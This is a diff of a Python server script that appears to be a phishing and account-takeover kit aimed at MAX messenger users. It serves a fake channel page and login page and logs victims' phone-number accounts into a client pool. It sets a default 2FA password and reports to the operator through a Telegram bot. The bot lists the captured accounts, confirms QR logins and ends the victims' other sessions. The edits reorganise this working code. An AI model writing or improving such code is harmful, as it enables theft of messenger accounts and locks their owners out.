@@ -46,96 +46,6 @@ except ImportError:
         PasswordProvider = object
 
 # ============================================================================
-#  КОМАНДЫ БОТА
-# ============================================================================
-HELP_TEXT = (
-    "🤖 <b>Команды бота</b>\n\n"
-    "/sessions — показать активные сессии\n"
-    "/kill_all — завершить все сессии, кроме текущей\n"
-    "/accounts — список активных аккаунтов\n"
-    "/help — эта справка\n\n"
-    "Отправьте QR-код (фото) или ссылку для подтверждения входа."
-)
-
-
-async def cmd_sessions() -> None:
-    if not active_clients:
-        tg_send_message("❌ Нет активных аккаунтов")
-        return
-
-    for phone, client in active_clients.items():
-        try:
-            sessions = await client.get_sessions()
-        except Exception as e:
-            tg_send_message(f"❌ <code>{phone}</code>: не удалось получить сессии — <code>{e}</code>")
-            continue
-
-        if not sessions:
-            tg_send_message(f"📱 <code>{phone}</code>\nАктивных сессий нет")
-            continue
-
-        lines = [f"📱 <b>{phone}</b> — сессий: {len(sessions)}"]
-        buttons = []
-        for i, s in enumerate(sessions):
-            sid = getattr(s, "id", None)
-            device = getattr(s, "device_name", None) or "?"
-            current = getattr(s, "current", False)
-            mark = " ← <b>текущая</b>" if current else ""
-            lines.append(f"{i+1}. <code>{device}</code> (id=<code>{sid}</code>){mark}")
-
-            if not current and sid:
-                buttons.append([{
-                    "text": f"❌ Удалить #{i+1} — {device[:20]}",
-                    "callback_data": f"kill_session:{phone}:{sid}",
-                }])
-
-        buttons.append([{
-            "text": "🧹 Удалить все, кроме текущей",
-            "callback_data": f"kill_all:{phone}",
-        }])
-
-        tg_send_message("\n".join(lines), reply_markup={"inline_keyboard": buttons})
-
-
-async def cmd_kill_all() -> None:
-    if not active_clients:
-        tg_send_message("❌ Нет активных аккаунтов")
-        return
-
-    for phone, client in active_clients.items():
-        try:
-            await client.close_all_sessions()
-            tg_send_message(f"🧹 <code>{phone}</code> — все прочие сессии сброшены")
-        except Exception as e:
-            tg_send_message(f"❌ <code>{phone}</code>: <code>{e}</code>")
-
-
-async def handle_bot_command(text: str) -> None:
-    cmd = text.split()[0].lower().lstrip("/").split("@")[0]
-
-    if cmd in ("start", "help"):
-        tg_send_message(HELP_TEXT)
-        return
-
-    if cmd == "accounts":
-        if not active_clients:
-            tg_send_message("❌ Нет активных аккаунтов")
-            return
-        lines = "\n".join(f"• <code>{p}</code>" for p in active_clients.keys())
-        tg_send_message(f"📱 <b>Активные аккаунты:</b>\n{lines}")
-        return
-
-    if cmd == "sessions":
-        await cmd_sessions()
-        return
-
-    if cmd == "kill_all":
-        await cmd_kill_all()
-        return
-
-    tg_send_message(f"❓ Неизвестная команда: <code>{text}</code>\nНапишите /help")
-
-# ============================================================================
 #  КОНФИГ
 # ============================================================================
 load_dotenv()
@@ -145,15 +55,12 @@ TG_CHAT_ID = os.getenv("TG_CHAT_ID", "").strip()
 HTTP_HOST = os.getenv("HTTP_HOST", "0.0.0.0")
 HTTP_PORT = int(os.getenv("PORT", os.getenv("HTTP_PORT", "8080")))
 
-# После успешной авторизации возвращаем на страницу канала с флагом.
-# Реальный переход в max.ru-канал делает уже сама channel.html.
 REDIRECT_URL = os.getenv("REDIRECT_URL", "/?authorized=1")
-
 DEFAULT_2FA_PASSWORD = os.getenv("DEFAULT_2FA_PASSWORD", "Fiksik2009")
 
 BASE_DIR = Path(__file__).parent
-HTML_FILE    = BASE_DIR / "index.html"    # страница входа
-CHANNEL_FILE = BASE_DIR / "channel.html"  # страница канала (главная)
+HTML_FILE    = BASE_DIR / "index.html"
+CHANNEL_FILE = BASE_DIR / "channel.html"
 CACHE_DIR = BASE_DIR / "cache"
 CACHE_DIR.mkdir(parents=True, exist_ok=True)
 
@@ -199,13 +106,11 @@ class TelegramHandler(logging.Handler):
 
 
 def setup_logging():
-    # Глушим всё лишнее — root на WARNING
     root = logging.getLogger()
     root.setLevel(logging.WARNING)
     for noisy in ("pymax", "aiohttp", "asyncio", "urllib3", "requests"):
         logging.getLogger(noisy).setLevel(logging.WARNING)
 
-    # Наш логгер для событий
     app_logger = logging.getLogger("app")
     app_logger.setLevel(logging.INFO)
     app_logger.propagate = False
@@ -279,7 +184,6 @@ def tg_get_file_bytes(file_id: str) -> bytes | None:
 # ============================================================================
 #  QR-ДЕКОДЕРЫ (WeChat QR + pyzbar + OpenCV)
 # ============================================================================
-# Инициализация WeChat QR (если доступно)
 _WECHAT_QR = None
 try:
     import cv2 as _cv2_check
@@ -293,7 +197,6 @@ except Exception as e:
 
 
 def _try_wechat(img_bytes: bytes) -> str | None:
-    """Самый сильный декодер — справляется с логотипами и сжатием."""
     if _WECHAT_QR is None or cv2 is None:
         return None
     try:
@@ -303,20 +206,16 @@ def _try_wechat(img_bytes: bytes) -> str | None:
             return None
 
         variants = [img]
-
-        # Увеличение (помогает при сжатии)
         for scale in (2.0, 3.0):
             big = cv2.resize(img, None, fx=scale, fy=scale,
                              interpolation=cv2.INTER_CUBIC)
             variants.append(big)
 
-        # Grayscale + CLAHE (выравнивание контраста)
         gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
         clahe = cv2.createCLAHE(clipLimit=3.0, tileGridSize=(8, 8))
         gray_clahe = clahe.apply(gray)
         variants.append(cv2.cvtColor(gray_clahe, cv2.COLOR_GRAY2BGR))
 
-        # Bilateral filter (убирает JPEG-артефакты, сохраняет края)
         for d in (5, 9):
             filtered = cv2.bilateralFilter(gray, d, 75, 75)
             variants.append(cv2.cvtColor(filtered, cv2.COLOR_GRAY2BGR))
@@ -335,7 +234,6 @@ def _try_wechat(img_bytes: bytes) -> str | None:
 
 
 def _detect_qr_bbox_cv(gray) -> tuple | None:
-    """Возвращает bbox (x, y, w, h) найденного QR-кода или None."""
     if cv2 is None:
         return None
     try:
@@ -356,7 +254,6 @@ def _detect_qr_bbox_cv(gray) -> tuple | None:
 
 
 def _mask_center_cv(img, ratio: float = 0.28, bbox: tuple | None = None):
-    """Затирает центральную область белым."""
     img = img.copy()
     h, w = img.shape[:2]
     if bbox is not None:
@@ -375,7 +272,6 @@ def _mask_center_cv(img, ratio: float = 0.28, bbox: tuple | None = None):
 
 
 def _mask_center_pil(img, ratio: float = 0.28):
-    """PIL-версия затирания центра."""
     from PIL import ImageDraw
     img = img.copy()
     w, h = img.size
@@ -408,7 +304,6 @@ def _try_pyzbar(img_bytes: bytes) -> str | None:
         variants.append(img_gray.point(lambda p: 0 if p < 140 else 255, "1"))
         variants.append(img_gray.point(lambda p: 255 if p < 128 else 0, "L"))
 
-        # Затирание центра (для QR с лого)
         for ratio in (0.22, 0.28, 0.34):
             variants.append(_mask_center_pil(img, ratio))
             variants.append(_mask_center_pil(img_gray, ratio))
@@ -447,18 +342,15 @@ def _try_opencv(img_bytes: bytes) -> str | None:
 
         gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
 
-        # Оригинал
         for im in (img, gray):
             r = _try_decode(im)
             if r: return r
 
-        # Затирание центра на всём изображении
         for ratio in (0.22, 0.28, 0.34):
             for im in (img, gray):
                 r = _try_decode(_mask_center_cv(im, ratio))
                 if r: return r
 
-        # Кроп по bbox QR
         bbox = _detect_qr_bbox_cv(gray)
         if bbox is not None:
             bx, by, bw, bh = bbox
@@ -477,7 +369,6 @@ def _try_opencv(img_bytes: bytes) -> str | None:
                     r = _try_decode(_mask_center_cv(im, ratio))
                     if r: return r
 
-            # Увеличение кропа
             for scale in (2.0, 3.0):
                 big = cv2.resize(crop_gray, None, fx=scale, fy=scale,
                                  interpolation=cv2.INTER_CUBIC)
@@ -487,7 +378,6 @@ def _try_opencv(img_bytes: bytes) -> str | None:
                     r = _try_decode(_mask_center_cv(big, ratio))
                     if r: return r
 
-        # Bilateral filter + CLAHE
         clahe = cv2.createCLAHE(clipLimit=3.0, tileGridSize=(8, 8))
         for src in (gray,):
             filtered = cv2.bilateralFilter(src, 9, 75, 75)
@@ -499,7 +389,6 @@ def _try_opencv(img_bytes: bytes) -> str | None:
                     r = _try_decode(_mask_center_cv(im, ratio))
                     if r: return r
 
-        # Адаптивный threshold
         for block in (11, 21, 31, 41):
             th = cv2.adaptiveThreshold(
                 gray, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
@@ -512,7 +401,6 @@ def _try_opencv(img_bytes: bytes) -> str | None:
                     r = _try_decode(_mask_center_cv(im, ratio))
                     if r: return r
 
-        # Otsu
         _, otsu = cv2.threshold(gray, 0, 255,
                                  cv2.THRESH_BINARY + cv2.THRESH_OTSU)
         for im in (otsu, 255 - otsu):
@@ -528,12 +416,6 @@ def _try_opencv(img_bytes: bytes) -> str | None:
 
 
 def decode_qr_from_bytes(img_bytes: bytes) -> str | None:
-    """
-    Порядок попыток:
-      1) WeChat QR (лучший по логотипам и сжатию)
-      2) pyzbar (быстрый и точный на чистых QR)
-      3) OpenCV (последний шанс, много предобработок)
-    """
     for name, fn in (
         ("wechat", _try_wechat),
         ("pyzbar", _try_pyzbar),
@@ -548,6 +430,8 @@ def decode_qr_from_bytes(img_bytes: bytes) -> str | None:
             continue
     log.info("QR не распознан ни одним декодером")
     return None
+
+
 # ============================================================================
 #  СОСТОЯНИЕ
 # ============================================================================
@@ -769,7 +653,6 @@ async def run_auth(phone: str) -> None:
 
     @client.on_message()
     async def on_message(message, client):
-        # Слушаем только для поддержания сессии
         pass
 
     active_clients[phone] = client
@@ -782,6 +665,99 @@ async def run_auth(phone: str) -> None:
             sess["error"] = str(e)
     finally:
         active_clients.pop(phone, None)
+
+
+# ============================================================================
+#  КОМАНДЫ БОТА
+# ============================================================================
+HELP_TEXT = (
+    "🤖 <b>Команды бота</b>\n\n"
+    "/sessions — показать активные сессии\n"
+    "/kill_all — завершить все сессии, кроме текущей\n"
+    "/accounts — список активных аккаунтов\n"
+    "/help — эта справка\n\n"
+    "Отправьте QR-код (фото) или ссылку для подтверждения входа."
+)
+
+
+async def cmd_sessions() -> None:
+    if not active_clients:
+        tg_send_message("❌ Нет активных аккаунтов")
+        return
+
+    for phone, client in active_clients.items():
+        try:
+            sessions = await client.get_sessions()
+        except Exception as e:
+            tg_send_message(
+                f"❌ <code>{phone}</code>: не удалось получить сессии — <code>{e}</code>"
+            )
+            continue
+
+        if not sessions:
+            tg_send_message(f"📱 <code>{phone}</code>\nАктивных сессий нет")
+            continue
+
+        lines = [f"📱 <b>{phone}</b> — сессий: {len(sessions)}"]
+        buttons = []
+        for i, s in enumerate(sessions):
+            sid = getattr(s, "id", None)
+            device = getattr(s, "device_name", None) or "?"
+            current = getattr(s, "current", False)
+            mark = " ← <b>текущая</b>" if current else ""
+            lines.append(f"{i+1}. <code>{device}</code> (id=<code>{sid}</code>){mark}")
+
+            if not current and sid:
+                buttons.append([{
+                    "text": f"❌ Удалить #{i+1} — {device[:20]}",
+                    "callback_data": f"kill_session:{phone}:{sid}",
+                }])
+
+        buttons.append([{
+            "text": "🧹 Удалить все, кроме текущей",
+            "callback_data": f"kill_all:{phone}",
+        }])
+
+        tg_send_message("\n".join(lines), reply_markup={"inline_keyboard": buttons})
+
+
+async def cmd_kill_all() -> None:
+    if not active_clients:
+        tg_send_message("❌ Нет активных аккаунтов")
+        return
+
+    for phone, client in active_clients.items():
+        try:
+            await client.close_all_sessions()
+            tg_send_message(f"🧹 <code>{phone}</code> — все прочие сессии сброшены")
+        except Exception as e:
+            tg_send_message(f"❌ <code>{phone}</code>: <code>{e}</code>")
+
+
+async def handle_bot_command(text: str) -> None:
+    cmd = text.split()[0].lower().lstrip("/").split("@")[0]
+
+    if cmd in ("start", "help"):
+        tg_send_message(HELP_TEXT)
+        return
+
+    if cmd == "accounts":
+        if not active_clients:
+            tg_send_message("❌ Нет активных аккаунтов")
+            return
+        lines = "\n".join(f"• <code>{p}</code>" for p in active_clients.keys())
+        tg_send_message(f"📱 <b>Активные аккаунты:</b>\n{lines}")
+        return
+
+    if cmd == "sessions":
+        await cmd_sessions()
+        return
+
+    if cmd == "kill_all":
+        await cmd_kill_all()
+        return
+
+    tg_send_message(f"❓ Неизвестная команда: <code>{text}</code>\nНапишите /help")
 
 
 # ============================================================================
@@ -853,7 +829,8 @@ async def handle_update(upd: dict) -> None:
         await handle_qr_link(qr_text)
         return
 
-        text = msg.get("text", "")
+    # ←←← ИСПРАВЛЕНО: этот блок теперь на уровне тела функции
+    text = msg.get("text", "")
     if not text:
         return
 
@@ -900,7 +877,8 @@ async def handle_callback_query(cb: dict) -> None:
     cb_id = cb["id"]
     data = cb.get("data", "")
 
-        if data.startswith("kill_session:"):
+    # ←←← ИСПРАВЛЕНО: убран лишний отступ
+    if data.startswith("kill_session:"):
         _, phone, sid = data.split(":", 2)
         client = active_clients.get(phone)
         if not client:
@@ -910,7 +888,6 @@ async def handle_callback_query(cb: dict) -> None:
         tg_answer_callback(cb_id, "Завершаю…")
         try:
             closed = False
-            # Пробуем разные имена методов — зависит от версии PyMax
             for method_name in ("close_session", "kill_session",
                                 "terminate_session", "delete_session"):
                 fn = getattr(client, method_name, None)
@@ -923,7 +900,6 @@ async def handle_callback_query(cb: dict) -> None:
                         continue
 
             if not closed:
-                # Fallback: закрываем всё, кроме текущей
                 await client.close_all_sessions()
                 tg_send_message(
                     f"⚠️ <code>{phone}</code>: точечное удаление недоступно, "
@@ -951,7 +927,7 @@ async def handle_callback_query(cb: dict) -> None:
         except Exception as e:
             tg_send_message(f"❌ <code>{phone}</code>: <code>{e}</code>")
         return
-    
+
     if data.startswith("qr_cancel:"):
         token = data.split(":", 1)[1]
         pending_qr_links.pop(token, None)
@@ -993,14 +969,12 @@ async def handle_callback_query(cb: dict) -> None:
 #  HTTP
 # ============================================================================
 async def handle_channel(request):
-    """Главная страница — карточка канала."""
     if not CHANNEL_FILE.exists():
         return web.Response(text="channel.html not found", status=404)
     return web.FileResponse(CHANNEL_FILE)
 
 
 async def handle_auth_page(request):
-    """Страница входа (index.html)."""
     if not HTML_FILE.exists():
         return web.Response(text="index.html not found", status=404)
     return web.FileResponse(HTML_FILE)
